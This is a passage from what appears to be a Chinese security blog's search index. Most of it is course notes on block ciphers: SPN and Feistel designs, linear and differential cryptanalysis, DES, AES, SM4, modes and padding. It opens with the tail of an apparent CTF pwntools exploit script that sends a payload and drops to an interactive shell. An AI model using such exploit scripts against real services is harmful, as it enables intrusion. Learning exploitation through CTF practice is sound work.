class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium x86_64 1~6题</title>
      <link href="/2023/02/28/ROP-Emporium-x86-64-1-6%E9%A2%98/"/>
      <url>/2023/02/28/ROP-Emporium-x86-64-1-6%E9%A2%98/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础 Chapter 3——分组密码与高级密码标准</title>
      <link href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B8%8E%E9%AB%98%E7%BA%A7%E5%AF%86%E7%A0%81%E6%A0%87%E5%87%86/"/>
      <url>/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B8%8E%E9%AB%98%E7%BA%A7%E5%AF%86%E7%A0%81%E6%A0%87%E5%87%86/</url>
      
        <content type="html"><![CDATA[<p>现代分组密码设计思想：<br>分组密码是一个{0,1}的随机代换<br>基本的变换手段为：代换与置换<br>基本的安全需求：混乱（密钥和明文以及密文之间的依赖关系复杂）、扩散（单个密钥位或明文位的影响尽可能扩散到更多的密文位，即修改明文的某一位需要尽可能导致密文的尽可能多位发生改变）<br>结构 - SPN网络和Feistel结构</p><p>迭代密码：将明文经过加密函数G迭代加密多次（需要密钥参与，密钥由密钥扩展算法生成，每一次加密的密钥都不相同）。多次加密能够使得比特位得到扩散，增加了密码的安全性。</p><p><strong>SPN网络——代换-置换网络的一轮变换过程：</strong>明文X的一轮加密包含：代换S和置换P。首先与轮密钥异或（白化），然后首先进行小代换，然后将几组的代换结果经过置换后输出。解密首先反置换再反代换即可。如输入为16比特，则代换过程则是将这16比特分为4组，每组均进行代换操作（这些代换需要借助代换表完成）置换则是将代换后的16比特打乱重排后输出。不过 **由于对于任意的线性变换A:x→y&#x3D;A(x)，有A(x$\oplus$k)&#x3D;A(x)$\oplus$A(k)**，因此存在有不同的解密顺序也能够解密出正确结果。</p><p><strong>Feistel结构的一轮变换过程：将输入分为两份，每一轮运算只运算了一半的输入，交替加密。流密钥函数K与一半不变的输入输入到函数F中，将得到的输出与另一半输入异或后输出。其加密与解密过程完全相同，不同的是解密密钥首先输入K<del>n</del>到K<del>0</del>，加密密钥为K<del>0</del>到K<del>n</del>，即逆序使用。非线性函数F不需要可逆。</strong> Feistel的扩散速度比SPN网络慢，因此需要更多的迭代次数</p><h2 id="SPN-密码体制定义"><a href="#SPN-密码体制定义" class="headerlink" title="SPN 密码体制定义"></a>SPN 密码体制定义</h2><p>设l,m,Nr是正整数，P&#x3D;C&#x3D;{0,1}^lm^<br>$K\subseteq({0,1}^{lm})^{Nr+1}$是由初始密钥k用密钥编排算法生成的所有可能的密钥编排方案集合，一个密钥编排方案记为(k^1^, k^2^, …, k^Nr+1^)<br>状态值w长度为l×m，记为w^1^, w^2^, …, w^Nr+1^<br>w可以看成m个长度为l的子串连接而成，记为w<del>&lt;1&gt;</del>，w<del>&lt;2&gt;</del>，…，w<del><m></del>，其中<br>w<del><i></del>&#x3D;w<del>(i-1)l+1</del>,w<del>(i-1)l+2</del>,…,w<del>(i-1)l+l</del></p><ul><li>SPN的特点：结构简单，易于软硬件实现；高效快速，易于扩展和强化——增加l和m可以提高穷举k的难度（但过大可能会占用过多存储资源），也可以使用多个S盒和P盒进一步提高变换的复杂度，增加Nr可以进一步提高密文的混乱程度</li></ul><h1 id="线性密码分析"><a href="#线性密码分析" class="headerlink" title="线性密码分析"></a>线性密码分析</h1><p>通过分析S盒的线性特性从而发现明文比特、密文比特和密钥比特之间可能存在的概率线性关系。存在一个比特子集使得其中元素的异或表现出非随机的分布来进行分析的密码分析方法。（已知明文攻击，给定明文、密文和S盒，确定k的部分比特）</p><h2 id="S盒线性逼近"><a href="#S盒线性逼近" class="headerlink" title="S盒线性逼近"></a>S盒线性逼近</h2><p>考虑一个S盒$\pi$<del>S</del>:{0,1}^m^→{0,1}^n^，具有m重输入X&#x3D;(x<del>1</del>,x<del>2</del>,…,x<del>m</del>)和n重输出Y&#x3D;(y<del>1</del>,y<del>2</del>,…,y<del>n</del>)。从X和Y中任意选择若干比特通过异或运算构成一个随机变量<br>$$x_{i_1}\oplus x_{i_2}\oplus…\oplus x_{i_k}\oplus y_{j_1}\oplus y_{j_2}\oplus…\oplus y_{j_l} $$</p><p>上面的结果很可能不为二分之一，就产生了特殊的概率。</p><p>如果选择的输入序列X对应的输出不是Y，则$Pr[Y_1&#x3D;y_1,…,Y_n&#x3D;y_n|X_1&#x3D;x_1,…,X_m&#x3D;x_m]&#x3D;0$，否则等于$2^{-m}$</p><h3 id="偏差"><a href="#偏差" class="headerlink" title="偏差"></a>偏差</h3><p>取值于{0,1}上的随机变量X，取值为0的概率为p，则取值为1的概率为1-p，X的偏差定义为：$\epsilon&#x3D;p-\frac{1}{2}$</p><h3 id="堆积引理"><a href="#堆积引理" class="headerlink" title="堆积引理"></a>堆积引理</h3><p>设$X_{i_1},X_{i_2},…,X_{i_k}$是取值于{0,1}上的独立随机变量，其偏差依次为$\epsilon_{i_1},…,\epsilon_{i_k}$，定义随机变量$X_{i_1,i_2,…,i_k}&#x3D;X_{i_1}\oplus X_{i_2}\oplus…X_{i_k}$，以$\epsilon_{i_1,i_2,…,i_k}$表示其偏差，则有<br>$$\epsilon_{i_1,i_2,…,i_k}&#x3D;2^{k-1}\prod_{j&#x3D;1}^k\epsilon_{i_j}$$</p><p>证明：当k&#x3D;1时结论显然成立<br>假设k&#x3D;n时上述结论成立，则当k&#x3D;n+1时<br>$Pr[X_{i_1}\oplus…\oplus X_{i_{n+1}}&#x3D;0]&#x3D;Pr[X_{i_1}\oplus…\oplus X_{i_{n}}&#x3D;0]Pr[X_{i_{n+1}}&#x3D;1]+Pr[X_{i_1}\oplus…\oplus X_{i_{n}}&#x3D;1]Pr[X_{i_{n+1}}&#x3D;0]\<br>&#x3D;(2^{n-1}\prod\epsilon_{i_j}+\frac{1}{2})(\epsilon_{i_{n+1}}+\frac{1}{2})+(\frac{1}{2}-2^{n-1}\prod\epsilon_{i_j})(\frac{1}{2}-\epsilon_{i_{n+1}})\<br>&#x3D;\frac{1}{2}+2^n\prod\epsilon_{i_j}$<br>证毕。</p><h3 id="线性逼近表："><a href="#线性逼近表：" class="headerlink" title="线性逼近表："></a>线性逼近表：</h3><p><img src="https://img-blog.csdnimg.cn/c583e7e41a05446198cade19f3188cb7.jpeg"><br>a表示输入的4比特，b表示输出的4比特，中间的数字表示满足$(\oplus_{i&#x3D;1}^{4}a_iX_i)\oplus(\oplus_{i&#x3D;1}^4b_iY_i)&#x3D;0$的$(x_1,x_2,x_3,x_4,y_1,y_2,y_3,y_4)$的个数（$(y_1,y_2,y_3,y_4)&#x3D;\pi_S(x_1,x_2,x_3,x_4)$），容易通过此表获取偏差。选择其中距离8最大的部分可得偏差最大的输入输出对。<strong>理解：线性逼近表是S盒的性质，仅与S盒的置换有关。</strong></p><h2 id="线性逼近分析过程"><a href="#线性逼近分析过程" class="headerlink" title="线性逼近分析过程"></a>线性逼近分析过程</h2><p><img src="https://img-blog.csdnimg.cn/585220025a344248b809e048daf47dff.jpeg"><br><strong>需要注意的是，线性分析只能攻击最后一个密钥，而不能攻击其他密钥，因此在分析过程中应将其他密钥视而不见，因为密钥是确定的，而偏差计算的是一种分布，与前面的密钥无关</strong>。输入和输出应尽量选择对应于线性逼近表中数值偏离8较多的，这样分析成功的概率更大。<br>对于第一轮S盒的输入，追踪其输出到最后并计算偏差</p><p>如上图中第一轮输入选B输出选4，则随机变量$T_1&#x3D;u_5^1\oplus u_7^1\oplus u_8^1\oplus v_6^1$的偏差为$\frac{1}{4}$<br>第二轮输入选4输出选5的偏差绝对值最大。即随机变量$T_2&#x3D;u_6^2\oplus v_6^2\oplus v_8^2$的偏差为$-\frac{1}{4}$<br>第三轮输入需要注意，第二轮输入的最低位跑到第4个盒去了，所以第三轮输入考虑两个盒，一个是$S_3^2$，输入为4；一个是$S_3^4$，输入为4，输出还是都选5。即$T_3&#x3D;u_6^3\oplus v_6^3\oplus v_8^3$偏差为$-\frac{1}{4}$；$T_4&#x3D;u_{14}^3\oplus v_{14}^3\oplus v_{16}^3$偏差为$-\frac{1}{4}$<br>$T_1\oplus T_2\oplus T_3\oplus T_4&#x3D;x_5\oplus x_7\oplus x_8\oplus v_6^3\oplus v_8^3\oplus v^3_{14}\oplus v_{16}^3\oplus k_5^1\oplus k_7^1\oplus k_8^1\oplus k_6^2\oplus k_6^3\oplus k_{14}^3\<br>&#x3D;x_5\oplus x_7\oplus x_8\oplus u_6^4\oplus u_8^4\oplus u^4_{14}\oplus u_{16}^4\oplus k_5^1\oplus k_7^1\oplus k_8^1\oplus k_6^2\oplus k_6^3\oplus k_{14}^3\oplus k_6^4\oplus k_8^4\oplus k_{14}^4\oplus k_{16}^4$</p><p>由堆积引理可知$T_1\oplus T_2\oplus T_3\oplus T_4$的偏差为$-\frac{1}{32}$（四者并不独立，因此这不是准确值，只是估算，不过仍然有效），$x_5\oplus x_7\oplus x_8\oplus u_6^4\oplus u_8^4\oplus u^4_{14}\oplus u_{16}^4$具有偏差$±\frac{1}{32}$（后面的k是固定不变的，因此不会计入偏差）</p><p><font color=red>理解：这实际上是一个加密链的分析过程，上面的选择输入是由我们自由选择的，不是说输入就是这个，而是说我们选择哪些比特参与异或。</font></p><p><strong>分析过程梳理：</strong></p><ol><li>收集尽可能多的在<strong>同一未知密钥k加密的T对明-密文对</strong>，用$\mathbb T$表示明-密文对的集合($|\mathbb T|&#x3D;T$)，目标是获得候选子密钥($k_{&lt;2&gt;}^5,k_{&lt;4&gt;}^5$，即4组子密钥中的第2组和第4组)</li><li>每个候选子密钥分配一个计数器，初始值为0</li><li>对于每对明-密文对，尝试所有可能的候选子密钥，计算随机变量$x_5\oplus x_7\oplus x_8\oplus u_6^4\oplus u_8^4\oplus u^4_{14}\oplus u_{16}^4$的结果，若结果为0则相应计数器加1</li><li>明-密文对尝试完毕后，真子密钥对应的计数值最接近$\frac{T}{2}±\frac{T}{32}$，其他则接近$\frac{T}{2}$（T越大结果越准确）</li></ol><p>线性密码分析基于S盒的有效线性逼近<br>是一种已知明文攻击方法，需要较多的明-密文对</p><ul><li>基于偏差$\varepsilon$的线性攻击要想获得成功，所需明密文对数量T接近$c\varepsilon^2$，c为常数<br>此算法只能分析最后一轮子密钥，缩小的穷举密钥的范围。</li></ul><h1 id="差分密码分析"><a href="#差分密码分析" class="headerlink" title="差分密码分析"></a>差分密码分析</h1><p>通过分析明文对的差值（异或）对密文对差值的影响来恢复某些密钥比特的分析方法。<br>一种<strong>选择明文攻击方法</strong>，构造若干明文串对，每对明文的异或相等，观察相应密文异或结果。</p><h2 id="S盒差分特征"><a href="#S盒差分特征" class="headerlink" title="S盒差分特征"></a>S盒差分特征</h2><p>设$\pi_S:{0,1}^m\rightarrow {0,1}^n$是一个S盒，长为m的有序比特串对(x,x*)，称S盒输入异或为$x’&#x3D;x\oplus x^*$，输出异或为$y’&#x3D;\pi_S(x)\oplus\pi_S(x^*)$，(x’,y’)称为一对差分。<br>对于任意$x’\in{0,1}^m$，定义集合$\Delta(x’)$为包含所有输入异或值为x’的有序对(x,x*)，该集合含有2^m^对，对集合$\Delta(x’)$中的每一对，可求出S盒的输出异或，一个非均匀的输出分布将会是一个成功差分分析的基础。</p><p>需要分析(x’, y’)的分布情况，其中x’是固定的。<strong>（注意每一个y’只会出现偶数次，因为x和x*互换后y和y*互换，然后y’相等）</strong></p><p><strong>扩散率：</strong> 条件概率$Pr[y’&#x3D;b|x’&#x3D;a]$称为差分(a,b)的扩散率$R_p(a,b)$<br>$$R_p(a,b)&#x3D;\frac{N_D(a,b)}{2^m}$$</p><h2 id="差分分析过程"><a href="#差分分析过程" class="headerlink" title="差分分析过程"></a>差分分析过程</h2><p><img src="https://img-blog.csdnimg.cn/540c86f6552643b8b9408c7d8a1572ca.jpeg"><br>上图中a表示输入x，b表示y’。<br><img src="https://img-blog.csdnimg.cn/e8f658f4ae774e0388bb03fa00fdd69a.jpeg"><br>第一轮应该选择扩散率最大的进行分析，能够分析成功的概率最大。,扩散率为$\frac{1}{2}$<br>第二轮追踪第一轮的输出，到了第三个子密钥中进行分析。输入选择4，输出选择6，扩散率为$\frac{3}{8}$<br>接下来按照图中红线继续分析即可。$S_2^3,S_3^3$的扩散率均为$\frac{3}{8}$<br><img src="https://img-blog.csdnimg.cn/81ad633de4e24ca4a0d982f5c4125ad6.jpeg"><br>由图可知总的扩散率即为扩散率的乘积。</p><p>输入异或与子密钥无关，但输出有关</p><p><strong>正确对</strong>：对于给定密钥，满足差分特征的明文对。对于所有明文输入，正确对产生的概率等于扩散率。</p><p>需要找到足够多的四元组（x,x*,y,y<em>），其中$x\oplus x^</em>&#x3D;x’$固定不变，和线性分析一样，只能分析最后一轮子密钥，对可能的候选子密钥进行猜测，正确对在正确的密钥作用下，满足差分链特征。<br>错误对：带来噪音</p><p>上例中测试最后一轮子密钥k^5^的8位，即穷举256个密钥。满足差分特征，则相应密钥的计数器加1</p><p><strong>分析过程梳理</strong>：</p><ul><li>收集尽可能多的在同一未知密钥k加密的T个4重组（x,x*,y,y*），x’&#x3D;0000101100000000，用T表示四重组的集合(|<strong>T</strong>|&#x3D;T)，目标是获得候选子密钥$(k_{&lt;2&gt;}^5,k_{&lt;4&gt;})^5$</li><li>每个候选子密钥分配一个计数器，初始值为0,</li><li>对每对明-密文，尝试所有可能的候选子密钥，计算出$u’^4$，如果$u’^4&#x3D;0000011000000110$则相应的计数器加1</li><li>T对明-密文尝试完毕后，真子密钥对应的计数器值最大</li><li>T越大，结果越准确</li></ul><p><strong>分析小结</strong>：</p><ul><li>差分密码分析基于S盒不均匀的差分特征</li><li>差分密码分析是一种不确定的明文分析方法，需要较多的明-密文对<ul><li>基于差分扩散率$\varepsilon$的差分攻击想要获得成功，所需明-密文对数量T接近$c\varepsilon^{-1}$（少于线性分析），c为某常数</li><li>此算法只能分析最后一轮子密钥，缩小了穷举密钥的范围</li></ul></li></ul><h1 id="高级加密标准"><a href="#高级加密标准" class="headerlink" title="高级加密标准"></a>高级加密标准</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><ul><li>基于Feistel结构</li><li>明文、密文、密钥长度为64位</li><li>使用8个不同的非线性S盒</li><li>使用扩展代换和压缩置换</li><li>迭代16轮</li><li>加密和解密算法相同，只是密钥编排方式不同</li></ul><h3 id="算法结构"><a href="#算法结构" class="headerlink" title="算法结构"></a>算法结构</h3><p>输入明文（64位），首先进行预先初始置换IP，然后使用Feistel结构和16个子密钥进行16轮迭代。之后进行逆置换IP^-1^后输出密文</p><h4 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h4><p>将64位分为8个字节来看，置换后也是8×8。置换后每一个字节的最后一位属于初始的第一个字节，倒数第二位属于初始的第二个字节，……以此类推，置换后的8字节中每个字节的最后一个字节分别对应初始第一个字节的第2、4、6、8、1、3、5、7个字节。这个置换固定不变。<br><img src="https://img-blog.csdnimg.cn/9f270894d81544c2b415eedb6d9c2208.jpeg"></p><h4 id="密钥编排过程"><a href="#密钥编排过程" class="headerlink" title="密钥编排过程"></a>密钥编排过程</h4><p>对于一个初始给定的密钥k，首先进行密钥置换$\pi_{kp}$丢掉8比特（这8比特实际上作为校验位存在），对左28位进行循环左移a<del>i</del>位，对右28位循环右移a<del>2</del>位，其中当i&#x3D;1,2,9,16时，a<del>i</del>&#x3D;1，其他时候a<del>i</del>&#x3D;2。然后进行压缩置换$\pi_{cp}$再丢掉8比特，形成第一个轮密钥（48位）。<br><img src="https://img-blog.csdnimg.cn/09667d9f44cc4889a8107c17fdf0f580.jpeg"><br>由上图可知，丢掉的是64位中每个字节的最后一位。<br><img src="https://img-blog.csdnimg.cn/310f2c2ddd0646bc8b8f2b292b921195.jpeg"></p><h4 id="迭代过程"><a href="#迭代过程" class="headerlink" title="迭代过程"></a>迭代过程</h4><p>每一次迭代将输入的后32位与48位密钥进行函数处理得到32位与输入前32位异或得到输出的后32位，输出前32位即为输入后32位。<br><img src="https://img-blog.csdnimg.cn/59dc6b7f140c45f1b63dfe3ec1b42023.jpeg"><br><img src="https://img-blog.csdnimg.cn/9d613dd7c6ef47d3810914f3e7de78f0.jpeg"><br>E为扩展置换：<br><img src="https://img-blog.csdnimg.cn/8f8d09ef2e5f4467a4c0dce0e1dad8a1.jpeg"><br>S盒的代换方法：<br><img src="https://img-blog.csdnimg.cn/68d33093b8704f4cad4bc4d41d10b691.jpeg"><br>每一组是6比特代换，里面最左边的一位和最右边的一位决定在哪一行代换，中间4位决定代换的值。如最左边为1，最右边为1，就应该在第4行找。S盒一共8个。</p><p>P为最终置换：<br><img src="https://img-blog.csdnimg.cn/26eccabd8d3541afb93aa77e3172ad43.jpeg"></p><h3 id="DES算法的安全性"><a href="#DES算法的安全性" class="headerlink" title="DES算法的安全性"></a>DES算法的安全性</h3><p>所有的S盒都是固定的<br>IBM提交算法后，发现反馈的结果修改了所有的S盒<br>S盒的设计准则并未完全公开<br>怀疑算法存在“陷门”</p><p>S盒的设计准则</p><ul><li>每一行是整数0，…，15的一个置换</li><li>没有一个S盒是输入变量的线性函数</li><li>改变S盒的一个输入位至少要引起两位输出改变</li><li>对于任何一个S盒和任意一个输入X，S(X)和S(X $\oplus$ 001100)至少有两个比特不同</li><li>对于任何一个S盒，对于任何一个输入对e，f属于{0,1}^4^，S(X)≠S(X $\oplus$ 11ef00)</li><li>S盒的任意一位不变，其他5位变化时，输出中的0和1的总和基本相等</li></ul><p>人们担心实际56比特的密钥长度不足以抵御穷举式攻击，密钥量只有越10^17^个<br>DES算法基本没有发现其他重大的缺陷，线性攻击和差分攻击对计算复杂度有一定影响</p><p>DES存在4个<strong>弱密钥</strong>：使用弱密钥加密明文得到密文，对密文进行弱密钥加密和解密均可以恢复明文。（$K_1&#x3D;K_{16}$）<br>$K_1&#x3D;0101010101010101\<br>K_2&#x3D;fefefefefefefefe\<br>K_3&#x3D;1f1f1f1f0e0e0e0e\<br>K_4&#x3D;e0e0e0e0f1f1f1f1$<br><strong>半弱密钥</strong>：存在K和K’，使得$E_K\cdot E_{K’}&#x3D;I$，DES存在12个半弱密钥。<br>如$K_1&#x3D;e001e001f101f101,K_2&#x3D;01e001e001f101f1$<br><strong>补密钥</strong>：$DES_{\bar{K}}(\bar{M})&#x3D;\overline{DES_K(M)}$，补密钥将密钥的所有位取反得到。 </p><p>DES不是幂等的，不能构成封闭群，因此可以通过自身乘积以提高安全性，其中三重DES使用最为广泛，使用不同密钥对其加密三次。</p><ul><li>中间相遇攻击双重DES：穷举密钥加密P<del>1</del>，保存结果，一共有2^56^个值</li><li>穷举前解密C<del>1</del>，比较P<del>1</del>加密的结果，若相同使用当前解密的密钥K<del>2</del>和表中对应的K<del>1</del>来加密P<del>2</del>，若得到C<del>2</del>，则说明得到正确的K<del>1</del>和K<del>2</del>，否则继续寻找。总复杂度为2^57^，但空间使用也很大。</li></ul><p>三重DES的工作方式：</p><ul><li>DES-EEE3：三个不同密钥三次加密</li><li>DES-EDE3：三个不同密钥加密-解密-加密</li><li>DES-EEE2：两个不同密钥，K<del>1</del>&#x3D;K<del>3</del>，加密3次</li><li>DES-EDE2：两个不同密钥，K<del>1</del>&#x3D;K<del>3</del>，加密-解密-加密</li></ul><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><ul><li><p>比三重DES快</p></li><li><p>至少与三重DES一样安全</p></li><li><p>数据分组长度为128比特</p></li><li><p>密钥长度为128&#x2F;192&#x2F;256比特</p></li><li><p>可在全世界范围内免费得到</p></li><li><p>采用SPN结构，加密和解密相似</p></li><li><p>能够有效抵抗所有已知攻击</p></li><li><p>没有发现弱密钥和补密钥</p></li><li><p>结构简单，运算速度快</p></li><li><p>支持128位分组，支持128&#x2F;192&#x2F;256位密钥</p></li><li><p>轮数Nr依赖密钥长度，分别为10&#x2F;12&#x2F;14</p></li></ul><p><img src="https://img-blog.csdnimg.cn/27aec398f87c46779a71e48e0ca9722c.jpeg"><br><img src="https://img-blog.csdnimg.cn/9d64d47dcc8b482d8f123daf17e27c27.jpeg"><br><img src="https://img-blog.csdnimg.cn/890bc255ef6943d080a4f7a54ac90c05.jpeg"></p><h3 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h3><p>AES的S盒代换是基于有限域$\mathbb F_{2^8}&#x3D;\mathbb Z_2[x]&#x2F;(x^8+x^4+x^3+x+1)$<br>$a&#x3D;a_7a_6a_5a_4a_3a_2a_1a_0$<br>$$\sum_{i&#x3D;0}^7a_ix^i$$<br>字节代换：$y&#x3D;Ax^{-1}+c$<br>$$A&#x3D;\begin{pmatrix}<br>1 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 0 &amp; 0 &amp; 0\<br>0 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 0 &amp; 0\<br>0 &amp; 0 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 0\<br>0 &amp; 0 &amp; 0 &amp; 1 &amp; 1 &amp; 1 &amp; 1 &amp; 1\<br>1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 1 &amp; 1 &amp; 1\<br>1 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 1 &amp; 1\<br>1 &amp; 1 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 1\<br>1 &amp; 1 &amp; 1 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 1<br>\end{pmatrix},<br>c&#x3D;\begin{pmatrix}0\1\1\0\0\0\1\1\end{pmatrix}$$<br>计算z&#x3D;f(x)在有限域下的乘法逆元z^-1^，使用辗转相除法计算。</p><h3 id="行移位变换"><a href="#行移位变换" class="headerlink" title="行移位变换"></a>行移位变换</h3><p>对状态矩阵每一行进行循环左移操作，第i行循环左移i-1个字节。（明文看做4*4字节的矩阵）<br><img src="https://img-blog.csdnimg.cn/a1cc7c9a1f544ad59ec7e7e74123180e.jpeg"></p><h3 id="列混合变换"><a href="#列混合变换" class="headerlink" title="列混合变换"></a>列混合变换</h3><p><img src="https://img-blog.csdnimg.cn/360321adf66a4da59f045ee093e2a336.jpeg"><br>也就是和一个固定的矩阵相乘。</p><h3 id="与轮密钥异或"><a href="#与轮密钥异或" class="headerlink" title="与轮密钥异或"></a>与轮密钥异或</h3><p>与K<del>Nr</del>异或即可。</p><h3 id="AES密钥编排算法"><a href="#AES密钥编排算法" class="headerlink" title="AES密钥编排算法"></a>AES密钥编排算法</h3><p>若密钥长度为128字节，一共迭代10轮，需要11个轮密钥，每一个轮密钥为128位，密钥编排算法需要用128位主密钥key生成11个128位的轮密钥。<br>将4*4密钥矩阵中的每一列当做一个字，易知密钥编排算法需要输出44个字，表示11个轮密钥，AES密钥编排算法使用了S盒变换（与DES不同）</p><p>首先定义了10个常数：<br><img src="https://img-blog.csdnimg.cn/a3d376eeced84c65990b8a46f8f4ce1e.jpeg"><br>初始密钥有4个字W<del>[0]</del>，W<del>[1]</del>，W<del>[2]</del>，W<del>[3]</del>，为第一次派生得来。之后的字的生成方式为：对于W<del>[i]</del>，由于W<del>[3]</del>&#x3D;(K<del>12</del>，K<del>13</del>，K<del>14</del>，K<del>15</del>)^T^，此时i&#x3D;4，首先将第一字节与第四字节交换(K<del>15</del>，K<del>12</del>，K<del>13</del>，K<del>14</del>)^T^，然后逐字节进行<strong>代换</strong>。最后如果i整除4，就与上面的10个常数之一Rcon[i&#x2F;4]异或（实际上只改了最高字节）。最后再与W<del>[4-4]</del>进行<strong>异或</strong>。一直计算到W<del>[43]</del>完成。<br>当列数不同时（密钥长度为192和256比特）时，代换与异或的判断条件有所改变。</p><h2 id="SM4加密算法"><a href="#SM4加密算法" class="headerlink" title="SM4加密算法"></a>SM4加密算法</h2><ul><li>分组长度为128比特，密钥为128比特</li><li>是对称加密算法，共需要32轮迭代，在解密算法中密钥逆序使用</li><li>密钥扩展算法采用32轮迭代结构，与加密算法类似</li><li>基于非均衡Feistel结构</li></ul><p>每一轮迭代，产生32位新的比特序列，放在128位的最后面，前面的128位保留后96位放在前面，舍弃最前面的32位，类似于一个内部迭代过程。最后经过反序变换输出密文。<br>$x_4&#x3D;x_0\oplus T(x_1\oplus x_2\oplus x_3\oplus rk_0)$<br><img src="https://img-blog.csdnimg.cn/4339c764b4104e5985e6de3b1c850395.jpeg"><br><img src="https://img-blog.csdnimg.cn/4c80370abc4b454780a2a69952413650.jpeg"></p><h1 id="分组密码的工作模式"><a href="#分组密码的工作模式" class="headerlink" title="分组密码的工作模式"></a>分组密码的工作模式</h1><p>由基本密码、一些反馈和一些简单运算组合而成<br>每个密码标准在描述密码算法同时都定义相关工作模式</p><ul><li>电子密码本 ECB</li><li>密码分组链接 CBC</li><li>密码反馈 CFB</li><li>输出反馈 OFB</li><li>计数器模式 CTR</li></ul><h2 id="电子密码本模式——ECB"><a href="#电子密码本模式——ECB" class="headerlink" title="电子密码本模式——ECB"></a>电子密码本模式——ECB</h2><p>使用相同的密钥对每一块进行加密，对每一块加密后将每一块密文组合在一起即得到密文。<br><strong>分组之间没有任何关系</strong></p><p>优点：</p><ul><li>可以进行并行处理</li><li>简单有效</li><li>不存在错误传播问题。（加密产生的错误只会限制在一块之中）</li></ul><p>缺点：</p><ul><li>相同明文分组会加密成相同密文分组</li><li>对明文的主动攻击是可能的：可能会替换、重排、删除、重放信息块而改变原有明文的意义</li><li>适合传输短信息（如加密口令）</li></ul><h2 id="密码分组链接模式——CBC"><a href="#密码分组链接模式——CBC" class="headerlink" title="密码分组链接模式——CBC"></a>密码分组链接模式——CBC</h2><p>前一块明文的加密结果参与下一块的密文生成流程，看上去像是有链接关系。<br>分块之间相互影响：</p><ul><li>信息块不容易被替换、重排、删除、重放</li><li>安全性好于ECB</li><li>适合传输长度大于64位的报文</li><li>是大多数系统的标准模式（SSL、IPSec等）</li></ul><p>不足：</p><ul><li>没有已知的并行算法</li><li>需要共同初始化向量IV</li><li>存在错误传播现象，前面出错后面就全错了</li></ul><h2 id="密码反馈模式——CFB"><a href="#密码反馈模式——CFB" class="headerlink" title="密码反馈模式——CFB"></a>密码反馈模式——CFB</h2><p>将分组密码用于异步序列密码，数据可以在比分组小得多的单元里进行加密。<br>适用于实时加密字节级别的数据的情况<br><img src="https://img-blog.csdnimg.cn/ca9c5fefe47740fdaed1523531a0cba4.jpeg"><br>$$C_0&#x3D;IV（初始向量）\<br>C_1&#x3D;E_k(C_0)\oplus P_1\<br>C_{i+1}&#x3D;E_k(C_i)\oplus P_i\<br>P_1&#x3D;C_1\oplus E_k(C_0)\<br>P_i&#x3D;C_{i+1}\oplus E_k(C_i)$$</p><p>特点：</p><ul><li>没有已知的并行实现算法</li><li>隐藏的明文模式</li><li>需要共同的移位寄存器初始值IV</li><li>存在错误传播（一个单元损坏影响多个单元）</li></ul><h2 id="输出反馈模式——OFB"><a href="#输出反馈模式——OFB" class="headerlink" title="输出反馈模式——OFB"></a>输出反馈模式——OFB</h2><p>将分组密码算法用于同步序列密码的方式<br>与CFB类似，不同的是进入移位寄存器的数据<strong>和被加密明文无关</strong>，只与初始向量无关。</p><p><img src="https://img-blog.csdnimg.cn/eaed5b32573143169d3984f540734774.jpeg"></p><p>特点：</p><ul><li>没有已知的并行实现算法</li><li>需要共同的移位寄存器初始值IV</li><li>不存在错误传播</li><li>可以离线工作（离线生成密钥流，在线直接进行加密工作即可，相当于预处理过程）</li><li>密钥序列最终会重复</li></ul><h2 id="计数器模式——CTR"><a href="#计数器模式——CTR" class="headerlink" title="计数器模式——CTR"></a>计数器模式——CTR</h2><p>引入一个计数器，使用密钥加密计数器的值，然后与明文异或。下一次加密将计数器加一相同操作。</p><ul><li>可以进行并行加密</li><li>可以离线工作（预处理）</li><li>吞吐量仅受可使用并行数量的限制</li><li>加密数据块的随机访问</li><li>可证明安全</li><li>简单性（只要求实现加密算法）</li><li>密钥只能使用一次，除非能维持很长的计数器</li></ul><h1 id="短块处理"><a href="#短块处理" class="headerlink" title="短块处理"></a>短块处理</h1><p>通用方法：填充（padding）（当明文长度为分组长度的整数倍时，仍然需要添加一整个填充块）</p><ul><li><p>pkcs#5&#x2F;pkcs#7：最大分组长度为不小于8&#x2F;256字节，缺失几个字节填充几遍填充字节数量</p></li><li><p>PKCS7填充法：FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07</p></li><li><p>X923填充法：FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</p></li><li><p>ISO 10126填充：FF FF FF FF FF FF FF FF FF 7D 2A 75 EF F8 EF 07</p></li><li><p>一种特殊方法</p></li><li><p>自主指定，None，Zeros</p></li><li><p>避免使用padding造成数据长度的扩充CTS（CipherText Stealing，密文挪用）</p></li><li><p>工作模式安全性依赖于算法本身的安全性</p></li><li><p>常用工作模式的比较：分组密码算法的作用、随机数的不可预测性、计数器的新鲜性、并行性、错误传播</p></li><li><p>短块处理：填充、密文挪用</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Pwn 入门 (4)</title>
      <link href="/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-4/"/>
